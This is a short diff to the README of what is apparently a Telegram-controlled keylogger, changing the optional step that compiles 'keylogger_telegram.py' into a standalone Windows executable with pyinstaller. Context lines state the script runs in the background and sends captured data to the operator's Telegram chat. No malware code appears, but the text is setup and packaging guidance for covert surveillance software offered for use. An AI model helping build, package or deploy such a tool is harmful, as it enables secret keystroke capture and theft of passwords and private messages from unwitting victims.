@@ -88,10 +88,10 @@ All commands must be sent to the bot in your Telegram chat. For commands that ta
     The script will start running in the background and will begin sending data to your Telegram chat.
 
 5.  **(Optional) Compile to EXE**:
-    You can compile the script into a standalone Windows executable using `pyinstaller`. A spec file (`keylogger_telegram.spec`) is included.
+    You can compile the script into a standalone Windows executable using `pyinstaller`.
     ```bash
     pip install pyinstaller
-    pyinstaller keylogger_telegram.spec
+    pyinstaller keylogger_telegram.py
     ```
     The executable will be located in the `dist` folder.
 
